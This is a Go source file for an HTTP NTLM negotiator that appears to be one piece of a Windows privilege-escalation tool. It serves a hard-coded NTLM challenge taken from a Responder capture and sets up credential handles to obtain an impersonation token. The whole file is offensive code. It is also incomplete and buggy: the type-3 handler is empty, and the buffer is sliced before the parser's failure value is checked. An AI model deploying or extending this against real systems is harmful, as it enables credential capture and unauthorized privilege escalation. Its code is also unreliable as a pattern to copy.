package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Grabbed from a pcap of responder for convenience
const (
	CHALLENGE = "TlRMTVNTUAACAAAABgAGADgAAAAFAomih5Y9EpIdLmMAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA=="
)

type _SecHandle struct {
	dwLower uint64
	dwUpper uint64
}

type SecHandle _SecHandle
type PSecHandle *_SecHandle
type CredHandle SecHandle
type PCredHandle PSecHandle
type CtxtHandle SecHandle
type PCtxtHandle PSecHandle

type SECURITY_INTEGER struct {
	LowPart  uint64
	HighPart int64
}

type TimeStamp SECURITY_INTEGER
type PTimeStamp *SECURITY_INTEGER

type HTTPNTLMNegotiatorResult struct {
	ImpersonationToken *windows.Token
	Error              error
}

type HTTPNTLMNegotiator struct {
	Host  string
	Port  int
	Chan  chan HTTPNTLMNegotiatorResult
	HCred CredHandle
}

func (negotiator HTTPNTLMNegotiator) Serve() (*windows.Token, error) {
	go http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)

	fmt.Println("[+] Started HTTP NTLM negotiator")
	result := <-negotiator.Chan

	return result.ImpersonationToken, result.Error
}

func (negotiator HTTPNTLMNegotiator) Trigger() bool {
	return true
}

// TODO add cookie jar/session tracking. Not really a necessity because there's only one target. However it would be nice to account for random network traffic.
func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *http.Request) {
	ntlmHash := req.Header.Get("Authorization")

	if len(ntlmHash) == 0 {
		res.Header().Set("WWW-Authenticate", "NTLM")
		res.WriteHeader(http.StatusUnauthorized)
		fmt.Println("[+] " + req.RemoteAddr + " connect")
		return
	}

	bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
	ntlmLoc := ParseNTLM(bytes)
	ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]

	if ntlmLoc == -1 || err != nil {
		res.Header().Set("WWW-Authenticate", "NTLM")
		res.WriteHeader(http.StatusUnauthorized)
		fmt.Println("[+] " + req.RemoteAddr + " connect")
	} else {
		messageType := bytes[ntlmLoc+8]
		switch messageType {
		case 1:
			res.Header().Set("WWW-Authenticate", "NTLM "+CHALLENGE)
			res.WriteHeader(http.StatusUnauthorized)
			fmt.Println("[+] " + req.RemoteAddr + " negotiate " + ntlmHash)
		case 3:
			res.Header().Set("WWW-Authenticate", "NTLM")
			res.WriteHeader(http.StatusOK)
			fmt.Println("[+] " + req.RemoteAddr + " authenticated")
		}
		negotiator.HandleNTLM(ntlmBytes, messageType)
	}
	//negotiator.Chan <- HTTPNTLMNegotiatorResult{nil, nil}
}

func (negotiator *HTTPNTLMNegotiator) HandleNTLM(ntlmBytes []byte, msgType byte) {
	switch msgType {
	case 1:
		timeStamp := TimeStamp{}
		_, _, err := acquireCredentialsHandle.Call(0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Negotiate"))), SECPKG_CRED_INBOUND, 0, 0, 0, 0, uintptr(unsafe.Pointer(&negotiator.HCred)), uintptr(unsafe.Pointer(&timeStamp)))

		fmt.Println(err)
	case 3:
	}
}

func ParseNTLM(bytes []byte) int {
	pattern := [7]byte{0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50}
	pIdx := 0

	for i, v := range bytes {
		if v == pattern[pIdx] {
			pIdx++
			if pIdx == 7 {
				return i - 6
			}
		} else {
			pIdx = 0
		}
	}

	return -1
}
